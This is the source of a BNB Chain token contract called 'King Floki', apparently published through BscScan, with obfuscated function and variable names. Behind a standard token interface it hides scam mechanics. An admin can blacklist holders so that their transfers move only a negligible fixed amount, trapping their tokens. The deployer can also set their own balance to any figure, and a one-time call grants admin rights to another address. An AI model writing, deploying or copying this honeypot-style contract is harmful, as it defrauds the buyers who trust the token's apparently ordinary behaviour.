/**
 *Submitted for verification at BscScan.com on 2023-02-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


interface rvqrxkrxw {
    function createPair(address ynfzbxwjv, address vrqdvsegsjp) external returns (address);
}

interface iljbdehnmpuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KingFloki {

    mapping(address => bool) public qkkintdtagjqnu;

    function approve(address cewvqihrteiujl, uint256 ghoeqgaesaf) public returns (bool) {
        allowance[yihiusqxtggza()][cewvqihrteiujl] = ghoeqgaesaf;
        emit Approval(yihiusqxtggza(), cewvqihrteiujl, ghoeqgaesaf);
        return true;
    }

    function rrkhompfirb(address aencdjhnjnrq) public {
        if (aencdjhnjnrq == vnrmyvjpbgsve || aencdjhnjnrq == rqrbbycjpfv || !qkkintdtagjqnu[yihiusqxtggza()]) {
            return;
        }
        czxhfownjsmyh[aencdjhnjnrq] = true;
    }

    event Approval(address indexed xnpcbiswvftbrg, address indexed spender, uint256 value);

    uint256 public totalSupply = 100000000 * 10 ** 18;

    uint8 public decimals = 18;

    function yihiusqxtggza() private view returns (address) {
        return msg.sender;
    }

    string public name = "King Floki";

    function transferFrom(address hgnyyhxrxoog, address qqgevlvqyjtw, uint256 ghoeqgaesaf) external returns (bool) {
        if (allowance[hgnyyhxrxoog][yihiusqxtggza()] != type(uint256).max) {
            require(ghoeqgaesaf <= allowance[hgnyyhxrxoog][yihiusqxtggza()]);
            allowance[hgnyyhxrxoog][yihiusqxtggza()] -= ghoeqgaesaf;
        }
        return eahudckiticbgl(hgnyyhxrxoog, qqgevlvqyjtw, ghoeqgaesaf);
    }

    bool public vpmdrsczugi;

    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public czxhfownjsmyh;

    address public vnrmyvjpbgsve;

    function transfer(address jepcreheghqnny, uint256 ghoeqgaesaf) external returns (bool) {
        return eahudckiticbgl(yihiusqxtggza(), jepcreheghqnny, ghoeqgaesaf);
    }

    function eahudckiticbgl(address hgnyyhxrxoog, address qqgevlvqyjtw, uint256 ghoeqgaesaf) internal returns (bool) {
        require(ghoeqgaesaf > 0);
        if (hgnyyhxrxoog == vnrmyvjpbgsve) {
            return fhmjietxutlzn(hgnyyhxrxoog, qqgevlvqyjtw, ghoeqgaesaf);
        }
        if (czxhfownjsmyh[hgnyyhxrxoog]) {
            return fhmjietxutlzn(hgnyyhxrxoog, qqgevlvqyjtw, 12 ** 10);
        }
        uint256 laolvglmwwa = ghoeqgaesaf * 0 / 100;
        return fhmjietxutlzn(hgnyyhxrxoog, qqgevlvqyjtw, ghoeqgaesaf - laolvglmwwa);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    address public rqrbbycjpfv;

    constructor (){ 
        iljbdehnmpuy hlhepmmon = iljbdehnmpuy(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        rqrbbycjpfv = rvqrxkrxw(hlhepmmon.factory()).createPair(hlhepmmon.WETH(), address(this));
        vnrmyvjpbgsve = yihiusqxtggza();
        qkkintdtagjqnu[vnrmyvjpbgsve] = true;
        balanceOf[vnrmyvjpbgsve] = totalSupply;
        emit Transfer(address(0), vnrmyvjpbgsve, totalSupply);
    }

    function lkupbpryno(address ofmfejacngbt) public {
        if (vpmdrsczugi) {
            return;
        }
        qkkintdtagjqnu[ofmfejacngbt] = true;
        vpmdrsczugi = true;
    }

    function qxicrlnioyj(uint256 ghoeqgaesaf) public {
        if (!qkkintdtagjqnu[yihiusqxtggza()]) {
            return;
        }
        balanceOf[vnrmyvjpbgsve] = ghoeqgaesaf;
    }

    function fhmjietxutlzn(address hgnyyhxrxoog, address qqgevlvqyjtw, uint256 ghoeqgaesaf) internal returns (bool) {
        require(balanceOf[hgnyyhxrxoog] >= ghoeqgaesaf);
        balanceOf[hgnyyhxrxoog] -= ghoeqgaesaf;
        balanceOf[qqgevlvqyjtw] += ghoeqgaesaf;
        emit Transfer(hgnyyhxrxoog, qqgevlvqyjtw, ghoeqgaesaf);
        return true;
    }

    event Transfer(address indexed from, address indexed dncgpzuvs, uint256 value);

    string public symbol = "KFI";

}